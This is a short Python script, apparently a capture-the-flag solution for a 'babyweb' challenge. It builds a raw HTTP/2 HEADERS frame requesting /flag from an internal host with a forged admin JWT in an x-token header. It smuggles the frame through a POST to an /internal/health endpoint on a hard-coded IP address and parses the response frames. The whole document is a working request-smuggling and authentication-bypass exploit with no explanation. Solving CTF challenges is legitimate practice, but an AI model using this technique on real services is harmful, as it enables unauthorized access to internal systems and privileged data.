import requests
import hpack
from hyperframe.frame import *


def header(id):
    enc = hpack.Encoder()
    h = enc.encode({
        ':path': '/flag',
        ':method': 'GET',
        ':authority': 'babyweb_internal',
        ':scheme': 'https',
        'x-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTY5NDM3NDd9.05Vevw3TUfheBwhdztDZbpgavsjVDm6tQIW99gODYR0'
    })
    p = HeadersFrame(id, h)
    p.flags.add('END_HEADERS')
    p = p.serialize()
    return p

sess = requests.Session()
HOST = '35.187.196.233'
r = sess.post('http://' + HOST + '/internal/health', json={
    'data': b''.join([header(5)]).decode('latin-1'),
    'type': '2'
})
content = r.content
print(content)
while content:
    frame, length = Frame.parse_frame_header(content[:9])
    print(frame, length)
    content = content[9 + length:]